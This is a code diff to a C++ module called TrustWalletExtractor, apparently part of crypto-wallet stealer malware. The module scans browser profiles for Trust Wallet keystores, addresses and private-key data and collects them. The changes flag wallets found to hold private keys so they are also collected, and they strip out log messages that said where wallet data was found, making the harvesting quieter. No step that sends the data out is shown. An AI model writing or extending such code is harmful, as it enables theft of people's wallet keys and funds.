@@ -7,6 +7,13 @@
 #include "../common.h"
 #include "../logger/file_logger.h"
 
+// External logging functions
+extern "C" {
+    void LogInfo(const char* message);
+    void LogError(const char* message);
+    void LogWarning(const char* message);
+}
+
 class TrustWalletExtractor {
 private:
     struct TrustWallet {
@@ -15,6 +22,7 @@ private:
         std::vector<std::string> keystores;
         std::vector<std::string> addresses;
         std::string password;
+        bool hasPrivateKeys = false;
     };
 
     std::vector<TrustWallet> wallets;
@@ -93,9 +101,9 @@ private:
         // Look for Local Storage
         ScanLocalStorage(extensionPath, wallet);
         
-        if (!wallet.keystores.empty() || !wallet.addresses.empty()) {
+        if (!wallet.keystores.empty() || !wallet.addresses.empty() || wallet.hasPrivateKeys) {
             wallets.push_back(wallet);
-            LogInfo(("[Trust] Found Trust Wallet data in " + browser + "/" + profile).c_str());
+            LogInfo("[Trust] Trust Wallet data collected");
         }
     }
     
@@ -223,7 +231,9 @@ private:
             size_t pos = content.find(pattern);
             if (pos != std::string::npos) {
                 // Extract key data (implementation would depend on format)
-                LogInfo(("[Trust] Found potential private key data in " + wallet.browser).c_str());
+                // NOTE: Do not log sensitive data findings for security
+                wallet.hasPrivateKeys = true;
+                break; // Found at least one, stop searching
             }
         }
     }
